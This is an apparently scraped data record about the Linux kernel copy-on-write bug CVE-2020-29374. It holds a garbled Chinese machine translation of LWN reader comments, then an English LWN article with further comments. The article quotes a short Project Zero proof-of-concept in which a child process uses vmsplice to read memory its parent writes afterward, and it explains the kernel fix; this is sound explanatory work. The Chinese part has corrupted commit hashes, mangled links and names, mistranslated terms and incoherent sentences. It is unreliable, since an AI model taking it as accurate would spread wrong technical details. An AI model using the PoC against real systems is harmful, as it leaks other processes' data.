6863\uff08\uff09\u540c\u6837\u5141\u8bb8\uff06gt; cl_args.stack\u4e3anull\uff09\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5b69\u5b50\u4f7f\u7528A\uff06gt;\u7236\u6bcd\uff06\uff0339; s\u5806\u6808\u7684\u526f\u672c\u3002 \uff08\u7f16\u5199\u7f16\u5199\u7684\u8bed\u4e49\u4fdd\u8bc1\uff06gt;\u5f53\u5b69\u5b50\uff06gt\u65f6\uff0c\u5b69\u5b50\u4f1a\u5728\uff06gt;\u8fc7\u7a0b\u4fee\u6539\u5806\u6808\u65f6\u5355\u72ec\u7684\u5806\u53e0\u526f\u672c\u3002\uff09\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5bf9\u4e8e\u6b63\u786e\u800cGT;\u64cd\u4f5c\uff0c\u4e0d\u5e94\u6307\u5b9aCLONE_VM\u9009\u9879\u3002 \uff08\u5982\u679c\u662f\uff06gt;\u5b69\u5b50\u56e0\u4f7f\u7528\uff06gt; clone_vm\u6807\u5fd7\u800c\u5206\u4eab\u7236\u7ea7\uff06\uff0339; s\u5185\u5b58\uff0c\u90a3\u4e48\u6ca1\u6709\u53d1\u751f\u7f16\u5199\u7684\u590d\u5236\u590d\u5236\u548c\u6df7\u4e71\u548cgt;\u5f88\u53ef\u80fd\u4f1a\u5bfc\u81f4\u3002\uff09\u542c\u8d77\u6765\u50cf\u662f\u8fd9\u6837\u7684\u58f0\u97f3\u6253\u7535\u8bdd\u7684\u4e50\u8da3\u3002\u73b0\u5728\u6211\u60f3\u77e5\u9053\u662f\u5426\u6709\u4efb\u4f55\u5f00\u53d1\u8005\u5df2\u7ecf\u51b3\u5b9a\u4ed6\u4eec\uff06\uff0334;\u9700\u8981\uff06\uff0334;\u7ed5\u8fc7Glibc\u5e76\u5728\u6211\u7684\u4efb\u4f55\u7cfb\u7edf\u4e0a\u62c9\u8fd9\u7c7b\u6697\u793a......\uff08\u6211\u662f\u4e00\u4e2aSRE\uff0c\u6240\u4ee5\u5982\u679c\u5b83\u5728\u751f\u4ea7\u4e2d\u95ef\u5165\uff0c\u90a3\u4e48\u6211\u7684\u95ee\u9898\u662f\u6211\u7684\u95ee\u9898\u3002 \uff06\uff0334;\u5e78\u8fd0\u7684\u662f\uff0c\uff06\uff0334;\u5927\u591a\u6570\u866b\u5b50I\uff06\uff0339;\u5df2\u7ecf\u770b\u5230\u7684\u5f80\u5f80\u6bd4\u8fd9\u66f4\u9ad8\uff0c\u4f46\u5b83\u4ecd\u7136\u6709\u70b9\u53ef\u6015\uff0c\u5373\u5185\u6838\u5c06\u8ba9\u4f60\u505a\u90a3\u6837\u7684\u4e8b\u60c5\u3002 *\u8fd9\u663e\u7136\u4e0d\u4f1a\u5728\u5185\u6838\u548c\uff0339;\u4e0d\u6253\u7834\u7528\u6237\u7a7a\u95f4\u7684\u7c89\u4e1d\u5949\u732e\uff0c\u4f46\u662f\u5047\u88c5\u4e00\u4f1a\u513f\u3002\n \u53d1\u8868\u4e8e3\u670823\u65e5\uff0c2021\u5e7410:08 UTC\uff08Tue\uff09\u7531Pbonzini\uff08\u272d\u652f\u6301\u8005\u272d\uff0c\uff0360935\uff09[\u94fe\u63a5]\n  posix_spawn\uff08\uff09\u4e0d\u662f\u5355\u4e2a\u7cfb\u7edf\u8c03\u7528\uff08\u6280\u672f\u4e0a\uff0cFork\uff08\uff09\u548cvfork\uff08\uff09\u662f\u514b\u9686\uff082\uff09\u5468\u56f4\u7684\u5305\u88c5\u5668\uff0c\u4f46\u81f3\u5c11\u540e\u8005\u662f\u5355\u4e2a\u7cfb\u7edf\u8c03\u7528\uff09\u3002\n \u80af\u5b9a\uff0c\u4f46\u5728\uff08\u8352\u8c2c\uff09\u5047\u8bbe\u6211\u4eec\uff06\uff0339;\u91cd\u65b0\u6d88\u9664\u725b\u7684\u5047\u8bbe\uff0c\u5185\u6838\u53ef\u80fd\u9700\u8981\u5ef6\u4f38\u4e0e\u7c7b\u4f3c\u4e8eFork + Exec\u7684\u80fd\u529b\u7684\u63a5\u53e3\uff0c\u5e76\u4e14\u8be5\u63a5\u53e3\u7684POSIX\u6807\u51c6\u540d\u79f0\u662fposix_spawn\u3002\n \u53d1\u8868\u4e8e3\u670823\u65e5\uff0c2021 23:00 UTC\uff08Tue\uff09\u7531Cyber\u200b\u200bax\uff08\u272d\u652f\u6301\u8005\u272d\uff0c\uff0352523\uff09[\u94fe\u63a5] \n\u663e\u7136\uff0c\u4eba\u4eec\u4e0d\u559c\u6b22posix_spawn\u3002\u4e5f\u8bb8\u6211\u4eec\u4f1a\u5c55\u73b0\u4e00\u4e2a\u5b8c\u6574\u7684\u66f4\u6362\uff0c\u5141\u8bb8\u521b\u5efa\u6682\u505c\u7684\u8fc7\u7a0b\uff0c\u8c03\u6574\u5176\u5c5e\u6027\uff08\u4f7f\u7528\u57fa\u4e8e\u6587\u4ef6\u53e5\u67c4\u7684API\uff09\uff0c\u7136\u540e\u6062\u590d\u5b83\u3002\u4f46\u6211\u89c9\u5f97\u6211\u4eec\u5b9e\u9645\u4e0a\u7684\u5b9e\u9645\u4e0a\u662f\u4e00\u79cd\u57fa\u4e8eIO_URE\u7684API\uff0c\u5b83\u53ef\u4ee5\u4f7f\u7528BPF\u6765\u5b9e\u73b0\u8fd9\u4e00\u70b9\u3002\n \u6211\u4eec_almost_\u5df2\u7ecf\u6709\u4e86\u4e00\u4e2aAPI\uff1aPtrace\u3002\u8f7b\u5fae\u7684\u95ee\u9898\u662fptrace\u771f\u7684\u5f88\u7cdf\u7cd5\u3002\u5b83\u7684\u5efa\u8bae\u4e5f\u592a\u7cdf\u7cd5\u4e86\uff0c\u6dfb\u52a0\u4e86\u57fa\u4e8eSaner\u5904\u7406\u7684\u7248\u672c\u3002\n  \u51e0\u5e74\u524d\u6211\u4eec\u8ba8\u8bba\u4e86\u8fd9\u7bc7\u8bba\u6587\uff0c\u8fd9\u4e89\u8fa9\u8bf4\uff0cFork\uff08\uff09\u57fa\u672c\u4e0a\u662f\u9519\u8bef\u7684\u539f\u59cb\u539f\u59cb\uff0c\u53ef\u4ee5\u6784\u5efaOS\u6d41\u7a0b\u7ba1\u7406\uff1ahttps://lwn.net/arlicle/785430/\n  \u53d1\u8868\u4e8e3\u670823\u65e5\uff0c2021\u5e7414:17 UTC\uff08TUE\uff09\u901a\u8fc7ABATTERS\uff08\u272d\u652f\u6301\u8005\u272d\uff0c\uff036932\uff09[\u94fe\u63a5]\n  \u6211\u6700\u8fd1\u8003\u8651\u8fc7vfork\uff08\uff09\uff0c\u4f46\u5728\u9047\u5230\u6709\u5173\u5b83\u7684\u8b66\u544a\u592a\u591a\u65f6\u6700\u7ec8\u4f1a\u53cd\u5bf9\u5b83\u3002\u4f8b\u5982\uff0c\u8bf7\u53c2\u9605Posix_spawn\uff08\uff09\u7684Vfork\uff08\uff09\u7684glibc\u5386\u53f2\uff1aglibc\uff06lt; = 2.23\uff1aposix_spawn\uff08\uff09\u4f7f\u7528vfork\uff08\uff09\u5982\u679c\u8bbe\u7f6e\u4e86posix_spawn_usevfork\uff0c\u6216\u8005\u5982\u679c\u5728IT Exec\uff083\uff09\u4e4b\u524d\u6ca1\u6709\u9884\u671f\u7684\u6e05\u9664\uff0c\u5219S\u8bf7\u6c42\u7684\u6587\u4ef6\u3002\u4f46\u662f\uff0c\u8fd9\u79cdvfork\uff08\uff09\u7684\u5b9e\u73b0\u662f\u8bb8\u591a\u9519\u8bef\u7684\u6765\u6e90\u3002 Linux Glibc\uff06gt; = 2.24\uff1aglibc\u63d0\u4ea49ff72da471a509a8c19791fe4697910469791046979105C19791046979110POSIX_SPAWN\uff08\uff09\u4ecevfork\uff08\uff09\u4ea4\u6362\u5230\u514b\u9686\uff08\u514b\u9686_vm | clone_vfork\uff09\uff0c\u5b83\u4f7f\u7528\u5355\u72ec\u7684\u5806\u6808\u4e3a\u5b69\u5b50\u3002\u8fd9\u4fee\u590d\u4e86\u8bb8\u591avfork\uff08\uff09 - \u76f8\u5173\u7684\u9519\u8bef\uff08\uff06\uff0334;\u53ef\u80fd\u7684\u7236clobber\u5230\u671f\u5806\u6808\u6ea2\u51fa\uff06\uff0334;\uff09\uff0c\u4f7f\u5176\u53ef\u4ee5\u901a\u8fc7\u9ed8\u8ba4\u548c\u5ffd\u7565posix_spawn_usevfork\u6765\u5b9e\u73b0\u3002\u6700\u8fd1\u7684\u975eLinux Glibc Glibc\u63d0\u4ea4CCFB2964726512F6669FEA99A43AFA714E2E6A80 POSIX_SPAWN_USEVFORK\u88ab\u5ffd\u7565\uff0c\u59cb\u7ec8\u4f7f\u7528\u5e38\u89c4\u53c9\uff08\uff09\uff0c\u7531\u4e8e\u96be\u70b9vfork\uff08\uff09\u5728\u6ca1\u6709Linux\u7279\u5b9a\u7684\u514b\u9686\uff08\uff09\u8bed\u4e49\u7684\u60c5\u51b5\u4e0b\u5de5\u4f5c\u3002\u8bf7\u6ce8\u610f\uff0c\u4f7f\u7528CLONE\uff08CLONE_VM | CLONE_VFORK\uff09\u5b89\u5168\u5730\u9700\u8981\u963b\u6b62\u6240\u6709\u4fe1\u53f7\uff0c\u5305\u62ecNPTL\u5185\u90e8\u4fe1\u53f7\u3002\u4f46\u662fGlibc\u5305\u88c5\u5668Don\uff06\uff0339; t\u8ba9\u60a8\u963b\u6b62NPTL-Internal Signal\uff0c\u4f7f\u5f97\u5728Glibc\u4e4b\u5916\u66f4\u96be\u4ee5\u505a\u5230\u3002\u67e5\u770b\u6240\u6709\u8840\u8165\u7ec6\u8282\u7684Glibc\u5b9e\u73b0\u3002\n  Na\u00efve\u975e\u5185\u6838\u5f00\u53d1\u4eba\u5458\u89c6\u89d2\uff1a\u8fd9\u4f3c\u4e4e_intually_\u5c31\u50cf\u95ee\u9898\u7684\u9519\u8bef\u89e3\u51b3\u65b9\u6848\u4e00\u6837\u3002\u5b69\u5b50\u4ecd\u7136\u53ef\u4ee5\u8bbf\u95ee\u8be5\u9875\u9762\uff0c\u6240\u4ee5\u80af\u5b9a\u5e94\u8be5\u88ab\u6807\u8bb0\u4e3a\u8bbf\u95ee\u8be5\u9875\u9762\uff0c\u53ea\u8981\u5b83\u786e\u5b9e\u6709\u4e00\u4e2a\u5f15\u7528\uff0c\u800c\u4e0d\u662f\u5047\u88c5\u5b83\u5e76\u6ca1\u6709\u8bbf\u95ee\u8be5\u9875\u9762\u53ea\u662f\u56e0\u4e3a\u5b83\u662fmunmap\uff06\uff0339; d\u3002\u53ea\u662f\u56e0\u4e3a\u9875\u9762\u5df2\u7ecf\u662fMunmap\uff06\uff0339; d\u5e76\u4e0d\u610f\u5473\u7740\u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\uff06\uff0339; t\u4ece\u4e2d\u8bfb\u53d6\uff0c\u4e3a\u4ec0\u4e48\u9875\u8868\u8868\u5220\u9664\u4e86\uff1f\u4f46\u662f\uff0c\u6211\u5047\u8bbe\u5b83\u662f\u4e00\u4e2a\u975e\u5e38\u597d\u7684\u539f\u56e0\uff0c\u4e3a\u4ec0\u4e48\u8fd9\u6837\u505a\u4e86\u3002\u6709\u4eba\u53ef\u4ee5\u6e05\u7406\u6211\u7684\u8bef\u89e3\u5417\uff1f\n \uff06gt;\u5b69\u5b50\u4ecd\u7136\u53ef\u4ee5\u8bbf\u95ee\u8be5\u9875\u9762\uff0c\u6240\u4ee5\u80af\u5b9a\u5e94\u8be5\u88ab\u6807\u8bb0\u4e3a\u8bbf\u95ee\u8be5\u9875\u9762\uff0c\u53ea\u8981\u5b83\u786e\u5b9e\u6709\u4e00\u4e2a\u5f15\u7528\uff0c\u800c\u4e0d\u662f\u5047\u88c5\u5b83\u5e76\u6ca1\u6709\u8bbf\u95ee\u8be5\u9875\u9762\u53ea\u662f\u56e0\u4e3a\u5b83\u662fmunmap\uff06\uff0339; d\u3002\u6211\u4e0d\u786e\u5b9a\u6211\u7406\u89e3\u4f60\u7684\u89c2\u70b9\uff0c\u4f46\u662f\u901a\u8fc7\u63d0\u4ea4\u6765\u963b\u6b62\u8fd9\u4e2a\u95ee\u9898\u3002\u5f53\u5b69\u5b50\u60f3\u8981\u91c7\u53d6\u989d\u5916\u7684\u53c2\u8003\uff08\u5bf9\u4e8eVMSPLICE\uff08\uff09\uff09\uff0c\u5b83\u4f1a\u83b7\u5f97\u526f\u672c\u800c\u4e0d\u662f\u4e0e\u7236\u7ea7\u5171\u4eab\u7684\u9875\u9762\u3002\u4e4b\u540e\uff0c\u5b69\u5b50\u7684\u9875\u9762\u8868\u548c\u7ba1\u9053\u70b9\u6301\u6709\u7684\u5f15\u7528\u70b9\u5bf9\u6b64\u65b0\u526f\u672c\uff0c\u4ee5\u53ca\u5bf9\u7236\u7ea7\u7684\u8bbf\u95ee\u4e22\u5931\u3002 \uff06gt;\u53ea\u662f\u56e0\u4e3a\u9875\u9762\u5df2\u7ecf\u662fMunmap\uff06\uff0339; d\u5e76\u4e0d\u610f\u5473\u7740\u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\uff06\uff0339; t\u4ece\u4e2d\u8bfb\u53d6\uff0c\u4e3a\u4ec0\u4e48\u9875\u8868\u8868\u5220\u9664\u4e86\uff1f\u8fd9\u53ea\u662fMunmap\uff08\uff09\u7684\u8bed\u4e49 - \u5b83 - \u5b83\u5fc5\u987b\u8c03\u6574VMA\u6811\u548cZAP Page\u8868\u6761\u76ee\uff0c\u4ee5\u4fbf\u5728\u90a3\u91cc\u4e0d\u518d\u8868\u793aMunmapped Range\u3002\u7136\u540e\uff0c\u5982\u679c\u8be5\u8fc7\u7a0b\u5c1d\u8bd5\u8bfb\u53d6/\u5199\u5165\u8be5\u533a\u57df\u5185\u7684\u5730\u5740\uff0cIT SEGFAULTS\u3002\u6211\u4eec\u53ef\u4ee5\uff06\uff0339; t\u7559\u4e0b\u9875\u8868\u6761\u76ee\uff0c\u4ec5\u662f\u56e0\u4e3a\u53e6\u4e00\u4e2a\u5f15\u7528\u5b58\u5728\u3002\u4ece\u7ba1\u9053\u8bfb\u53d6\u5e76\u901a\u8fc7\u8fd9\u4e9b\u9875\u9762\u8868\u3002 \n\u4f5c\u4e3a\u975e\u5185\u6838\u5f00\u53d1\u4eba\u5458\uff0c\u6211\uff06\uff0339;\u597d\u5947\uff1a\u56de\u60f3\u8d77\u6765\uff0c\u8fd9\u5934\u725b\u662f\u6839\u672c\u9519\u8bef\u7684\u5417\uff1f\u4e3a\u4ec0\u4e48\u4e0d\u6cbb\u7597VMSplice\u53c2\u8003\uff06\uff0334;\u53c2\u8003\u8d44\u6599\uff06\uff0334;\u5728Munmap\u4e4b\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528\u6237\u7a7a\u95f4\u8fc7\u7a0b\u65e0\u6cd5\u8fdb\u5165\u7684\u9875\u9762\uff0c\u540c\u65f6\u4ecd\u7136\u4fdd\u6301\u5185\u6838\uff06\uff0339; s\u5f15\u7528\uff1f\n \u539f\u5219\u662f\uff0c\u4f46\u662f\u4f60\u6709\u5176\u4ed6\u95ee\u9898\u3002\u4f8b\u5982\uff0cMMAP\u53ef\u7528\u4e8e\u5728\u56fa\u5b9a\u5730\u5740\u5904\u5206\u914d\u5185\u5b58\u3002\u96be\u4ee5\u5224\u65ad\u4efb\u4f55\u7ed9\u5b9a\u7684\u5730\u5740\u662f\u5426\u5408\u9002\uff08\u56e0\u4e3a\u5176\u4ed6\u9875\u9762\u7b49\u53ef\u80fd\u662f\u5728\u8def\u4e0a\uff09\uff0c\u4f46\u5982\u679c\u60a8\u53ea\u662f\u521a\u521a\u6620\u5c04\u5b83\uff0c\u90a3\u4e48\u5728\u540c\u4e00\u5730\u5740\u548c\u5927\u5c0f\u7684\u540e\u7eedMMAP\u4e2d\uff0c\u5b83\u5c06\u771f\u7684\u5f88\u5947\u602a\u3002\u7528\u6237\u4f69\u52e4\u53ef\u80fd\u4f1a\u5047\u8bbe\u5b83\u4e0d\u9700\u8981\u68c0\u67e5\u8be5\u6848\u4f8b\u4e2dmmap\u7684\u9519\u8bef\u4ee3\u7801\uff08\u6216\u8005\u5b83\u53ef\u80fd\u6ca1\u6709\u5408\u9002\u7684\u6062\u590d\u4ee3\u7801\uff0c\u5e76\u4e14\u53ea\u9700\u547c\u53eb\u4e2d\u6b62\uff083\uff09\uff09\u3002\u56e0\u6b64\uff0c\u73b0\u5728\u60a8\u7684\u89e3\u51b3\u65b9\u6848\u9700\u8981\u5728\u9690\u85cf\u9875\u9762\u9876\u90e8\u5806\u53e0\u5806\u53e0\u65b0\u9875\u9762\uff0c\u6216\u91cd\u65b0\u5b9a\u4f4d\u9690\u85cf\u9875\u9762\uff0c\u5176\u4e2d\u4efb\u4f55\u4e00\u4e2a\u90fd\u662f\u4e0d\u52a8\u7684\u3002\u751a\u81f3\u6ca1\u6709\u63d0\u5230\u60a8\u9700\u8981\u6559\u5bfcVMSplice\u4ee5\u4e0ePages Do\u76f8\u540c\u7684\u65b9\u5f0f\u8ddf\u8e2aVMSplice\u4ee5\u8ddf\u8e2a\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u5f15\u7528\uff0c\u800c\u6ca1\u6709\u7528\u6237\u7a7a\u95f4\u9875\u9762\u6620\u5c04\u4e2d\u5b9e\u9645\u5b58\u5728\u7684\u9875\u9762\u3002\u8fd9\u4e9b\u90fd\u662f\u89e3\u51b3\u7684\u95ee\u9898\uff0c\u8fd9\u662f\u4e00\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u56e0\u6b64\u89e3\u51b3\u4e86\u96be\u9898\u4e0d\u662f\u4fee\u590d\u7684\u7406\u60f3\u5f62\u5f0f\u3002\u5728\u7b80\u5355\u7684\u725b\u4f11\u606f\u4e2d\u6295\u63b7\u662f\u4e00\u79cd\u66f4\u76f4\u63a5\u7684\u89e3\u51b3\u65b9\u6848\uff08\u4f46\u662f\uff0c\u4f5c\u4e3a\u6545\u4e8b\u6697\u793a\uff0c\u53ef\u80fd\u4f1a\u6709\u4e00\u4e9b\u5e76\u53d1\u75c7\uff0c\u4ed6\u4eec\u672a\u80fd\u89e3\u91ca\uff09\u3002\n \uff06gt;\u5982\u679c\u60a8\u53ea\u662f\u521a\u521aMunmapped\u5b83\uff0c\u5bf9\u4e8e\u540c\u4e00\u5730\u5740\u548c\u5927\u5c0f\u7684\u540e\u7eedMMAP\uff0c\u5b83\u5c06\u975e\u5e38\u5947\u602a\u3002\u7528\u6237\u4f69\u52e4\u53ef\u80fd\u4f1a\u5047\u8bbe\u5b83\u4e0d\u9700\u8981\u68c0\u67e5\u8be5\u6848\u4f8b\u4e2dmmap\u7684\u9519\u8bef\u4ee3\u7801\uff08\u6216\u8005\u5b83\u53ef\u80fd\u6ca1\u6709\u5408\u9002\u7684\u6062\u590d\u4ee3\u7801\uff0c\u5e76\u4e14\u53ea\u9700\u547c\u53eb\u4e2d\u6b62\uff083\uff09\uff09\u3002\u8fd9\u8ba9\u6211\u60f3\u8d77\u4e86\u4e00\u4e2a\u53e4\u8001\u7684\u9519\u8bef\uff1a\u5927\u7ea6\u5341\u5e74\u524d\uff0cFirefox\uff08\u4f7f\u7528Jemalloc\u7684\u4ee3\u7801\uff09\u4f1a\u5c1d\u8bd5\u505a\u4e00\u4e2a\u5927\u7684\u5bf9\u9f50\u5206\u914d\uff0c\u5982\uff06\uff0334; p = mmap\uff08null\uff0csize * 2\uff09; Munmap\uff08P\uff09; p = mmap\uff08round_up\uff08p\uff0c\u5bf9\u9f50\uff09\uff0c\u5927\u5c0f\uff09;\uff06\uff0334;\u5373\uff0c\u4f7f\u7528\u7b2c\u4e00\u4e2aMMAP + MUNMAP\u5728\u5730\u5740\u7a7a\u95f4\u4e2d\u53d1\u73b0\u8db3\u591f\u5927\u7684\u5b54\uff0c\u7136\u540e\u5728\u8be5\u5b54\u4e2d\u7684\u6b63\u786e\u5bf9\u9f50\u5730\u5740\u5904\u5206\u914d\u3002\u5982\u679c\u7b2c\u4e8c\u4e2aMMAP and\uff0339; t\u8fd4\u56de\u8bf7\u6c42\u7684\u5730\u5740\uff0c\u5fc5\u987b\u6709\u4e00\u4e2a\u7ade\u4e89\u6761\u4ef6\u4e0e\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u5206\u914d\u5728\u540c\u4e00\u4e2a\u5b54\u4e2d\uff0c\u56e0\u6b64\u5b83\u4f1a\u5faa\u73af\u5e76\u518d\u6b21\u5c1d\u8bd5\uff0c\u5e76\u5e0c\u671b\u4e0b\u6b21\u66f4\u597d\u8fd0\u6c14\u3002\u8fd9\u6b63\u5e38\u5de5\u4f5c\u597d\uff0c\u76f4\u5230\u5b83\u5728\u5185\u6838\u4e0a\u8fd0\u884c\u4e86\u968f\u673aMMAP\u7684\u5b89\u5168\u529f\u80fd\uff0c\u5e76\u5b8c\u5168\u5ffd\u7565\u4e86\u5730\u5740\u53c2\u6570\uff08\u4ece\u6280\u672f\u4e0a\u90fd\u662f\u53ef\u4ee5\u7684\uff0c\u56e0\u4e3a\u5b83\u88ab\u5b9a\u4e49\u4e3a\u53ea\u662f\u4e00\u4e2a\u63d0\u793a\uff0c\u800c\u4e0d\u662f\u8981\u6c42\uff09\uff0c\u56e0\u6b64\u4ee3\u7801\u88ab\u56f0\u5728\u65e0\u9650\u5faa\u73af\u3002\u8fd9\u662f\u56fa\u5b9a\u7684\u5e74\u9f84\uff0c\u4f46\u5b83\u786e\u5b9e\u53ef\u4ee5\u5408\u7406\u4e8e\u67d0\u4e9b\u7528\u6237\u7a7a\u95f4\u4ee3\u7801\u53ef\u80fd\u4ecd\u7136\u540c\u6837\u4e0d\u660e\u667a\u7684\u5047\u8bbe\u3002\n  PTE\u5fc5\u987b\u6d88\u5931\uff0c\u56e0\u4e3a\u90a3\u4e2a\uff06\uff0339; s\u88ab\u6307\u5b9a\u4e3adummap\uff08\uff09\u662f\u4ec0\u4e48\u3002\u6b64\u5916\uff0c\u5b83\u7684\u4e8b\u5b9e\uff06\uff0339; s t\n...... ", "note_en": "Please consider subscribing to LWN Subscriptions are the lifeblood of LWN.net. If you appreciate this content and would like to see more of it, your subscription will help to ensure that LWN continues to thrive. Please visit  this page to join up and keep LWN on the net.\n   The kernel&#39;s memory-management subsystem is built upon many concepts, oneof which is called &#34;copy on write&#34;, or &#34;COW&#34;.The idea behind COW is conceptually simple, but itsdetails are tricky and its past is troublesome. Any change to itsimplementation can have unexpected consequences and cause subtle breakagefor existing workloads. So it is somewhat surprising that last year we sawtwo major changes the kernel&#39;s COW code; less surprising is the fact that,both times, these changes had unexpected consequences and broke things. Some of the resulting problems are still not fixedtoday, almost ten months after the first change, while the original reasonfor the changes \u2014 a security vulnerability \u2014 is also not fully fixed. Readon for a description of COW, the vulnerability, and the initial fix; theconcluding article in the series will describe the complications that arosethereafter.  Copy on write is a standard mechanism for sharing a single instance of anobject between processes in a situation where each process has the illusionof an independent, private copy of that object. Examples include memorypages shared between processes or data extents shared between files. Tosee how COW is used in the memory-management subsystem, consider whathappens when a process calls  fork(): the pages in that process&#39;sprivate memory areas should no longer be shared between the parent andchild. But, instead of creating new copies of those pages for the childprocess during the  fork() call, the kernel will simply map theparent&#39;s pages in the child&#39;s page tables. Importantly, the page-tableentries in both parent and child are set as read-only (write-protected). If either process attempts to write to one of thesepages, a page fault will occur, and the kernel&#39;s page-fault handler willcreate a new copy of the page, replacing the page-table entry (PTE) in thefaulting process with a PTE that references the new page, but which allowsthe write to proceed. This action is often referred to as &#34;breakingCOW&#34;. If the other process then tries to write to that same page, anotherpage fault will occur, as that process&#39;s PTE is still marked read-only. But now thepage-fault handler will recognize that the page is no longer shared, sothe PTE can just be made writable and the process can resume. The benefits of this scheme are lower memory consumption and a reduction ofCPU time spent copying pages during  fork() calls. Often the priceof copying is never paid for many of the pages because the childmight call  exit() or  exec() before either the parent orthe child writes to those pages. While the COW mechanism looks simple, the devil is in the details, as hasbeen  shown already in the past. The recenttrouble in this area started in 2020; it resulted in two major changes whileattempting to fix a vulnerability \u2014 which is actually still not fixed in allscenarios \u2014 and resulted in many corner cases, some of which are still notfully ironed out. The first public sign of issues with the COW mechanism appeared in the form of commit 17839856fd58(&#34;gup: document and work around &#39;COW can break either way&#39;issue&#34;) at the end of May 2020. The changelog doesn&#39;t fully describe theproblem scenario, but what is there is ominous enough: End result: the get_user_pages() call might result in a page pointer that is no longer associated with the original VM, and is associated with - and controlled by - another VM having taken it over instead.\n Any doubts about whether the commit fixed a security vulnerability vanishwhen one notices the Reported-by tag mentioning Jann Horn; presumablyHorn&#39;s report went through the appropriate non-public securitychannels. The practice of making fixes to some vulnerabilities immediatelypublic without explicitly marking them as such is not new, especially inthe COW area. Nevertheless, the related  ProjectZero issue was made public in August, and CVE-2020-29374 was assignedin December; both point to the above-mentioned commit as the fix. As the Project Zero issue includes proof-of-concept (PoC) code, we can look atthe fix with that code in mind and not rely on the incomplete commit log. Themost important parts of the PoC are the following: static void *data; posix_memalign(&amp;data, 0x1000, 0x1000); strcpy(data, &#34;BORING DATA&#34;); if (fork() == 0) {\t// child\tint pipe_fds[2];\tstruct iovec iov = {.iov_base = data, .iov_len = 0x1000 };\tchar buf[0x1000];\tpipe(pipe_fds);\tvmsplice(pipe_fds[1], &amp;iov, 1, 0);\tmunmap(data, 0x1000);\tsleep(2);\tread(pipe_fds[0], buf, 0x1000);\tprintf(&#34;read string from child: %s\\n&#34;, buf); } else {\t// parent\tsleep(1);\tstrcpy(data, &#34;THIS IS SECRET&#34;); }\n The code starts by allocating an anonymous, private page and writing somedata there; it then calls  fork(). At that point, the page becomesa COW page \u2014 it is write-protected for the parent process by making thecorresponding page-table entry read-only, and for the child process anidentical PTE is created. Then, while the parent is blocked inside sleep(), the child creates a pipe and passes the page to that pipewith  vmsplice(), a system call that is similar to  write()but which allows a zero-copy data transfer of the page&#39;s contents. In orderto achieve that, the kernel takes a reference on the source page (by increasing itsreference count) through  get_user_page() or one of its variants;the set of these functions is often referred to as &#34;GUP&#34;. The child thenunmaps the page from its own page tables (but retains the reference in thepipe) and goes to sleep. The parent wakes up from its sleep and writes new data to the page. Thepage table entry is write-protected, so the write causes a page fault. Thepage-fault handler can tell that this is fault on a COW page because thethe mapping allows write access while the PTE is write protected. If therewere more processes mapping the page then the content would have to becopied (breaking COW), but if there is a single mapping, the page canbe just made writeable. The kernel relies on the value returned by  page_mapcount()to determine how many mappings exist. Here is the problem:  page_mapcount() at this point in the PoC&#39;sexecution includes only the parent&#39;s mapping, because the child has alreadycalled  munmap() on that page. This function does not take intoaccount the fact that the child can still access the parent&#39;s page throughthe pipe; it ignores the elevated page reference count. Thus, the kernel allowsthe parent process to write new data into the page, which is no longerconsidered to be a COW page. Finally, the child wakes up and reads that newdata from the pipe, which might include sensitive information that theparent did not expect the child to see. One might rightfully ask why this potential of leaking data from parent tochild can matter in practice, as both processes are normally executing thecode from the same binary and the  fork() only acts as a branch inthe code. So we can assume that, either the binary is trusted and thus thechild process is too, or it is not and then we probably should not let theparent access any sensitive data in the first place. And, in the scenariowhere  fork() from a trusted binary is followed by an exec() of a potentially malicious binary,  exec() removesall shared pages from the address space of the child process before loadingthe new binary. But, as the Project Zero issue mentions, there areenvironments, such as Android, where each process is forked from a zygoteprocess without a subsequent  exec(), for performance reasons.That could lead to a situation that looks a lot like the PoC exploit forthis bug. Moreover, the  vmsplice() syscall might just be a symptom of abroader issue, since there are many other callers of the GUP functions inthe kernel. So it is a good idea in general not to let a child processhold on to a page shared through the COW mechanism with the parent whileletting the parent write new contents to the page. To prevent exploits of this behavior,commit 17839856fd58 made it impossible to get areference (even a read-only reference) via GUP to a COW-shared page. Allsuch attempts now result in breaking COW and returning a reference to the new copy instead. Thus,in the PoC code above, calling  vmsplice() now causes the childprocess to replace the shared COW page in the corresponding page tableentry with a new page, which is then passed to the pipe. Afterward, thechild no longer has any way to access the parent&#39;s page and the newcontents written there. The commit notes the possibility of worse performance for some GUP users,especially those that rely on a lockless variant of the interface like get_user_pages_fast(). The changelog continues that finer-grainedrules could be added later for situations where it is clear that it is safe tokeep sharing the COW page because it can never be overwritten with new,potentially sensitive contents. The system-wide zero-page would be oneexample of this sort of situation. But otherwise, Linus Torvalds (theauthor of the change) expectedno fundamental issues with this aggressively COW-breaking approach forGUP. Linux 5.8 was duly released with this commit. And this, one might think, was the end of the problem. But, as wasmentioned at the outset, COW is a complicated and subtle beast. In truth,the problems were just beginning. The second half of this article willdelve into how the COW fix led to a stampede of new problems that stillhave yet to be completely solved.     ( Log in to post comments)\n  What a cliffhanger!  I certainly am glad that project zero is there to root out these bugs (pun intended).\n &#34;But, as the Project Zero issue mentions, there are environments, such as Android, where each process is forked from a zygote process without a subsequent exec(), for performance reasons. That could lead to a situation that looks a lot like the PoC exploit for this bug.&#34;\n  It&#39;s definitely a problem because it doesn&#39;t match the user&#39;s mental model of how fork() is supposed to work. It&#39;s clear that either COW must be broken in this case or a mapping must be retained (or the refcounts split into per-mm versions, which seems likely to be far more expensive). The conceptually ideal approach would have everything act just like normal data, i.e. recognise things like vmsplice references *as* references so you don&#39;t need to specially break COW early for them -- but this seems likely to be viciously complex and of only minor benefit. Of course, hunting down every single way a reference can be taken by a child and arranging to COW-break on all of them seems likely to be a nightmarish game of whack-a-mole too...\n  Posted Mar 22, 2021 20:52 UTC (Mon) by  Cyberax ( \u272d supporter \u272d, #52523) [ Link]\n  Over the years I found that COWs are just bad and it&#39;s best to avoid them altogether.\n If you&#39;re going to break API compatibility anyway,* then you might as well just tell people to use vfork() or posix_spawn(), as those are already mature and well-understood interfaces, and the latter is even portable.  Incidentally, while researching this comment, I stumbled across this tidbit from clone(2):  &gt; In contrast to the glibc wrapper, 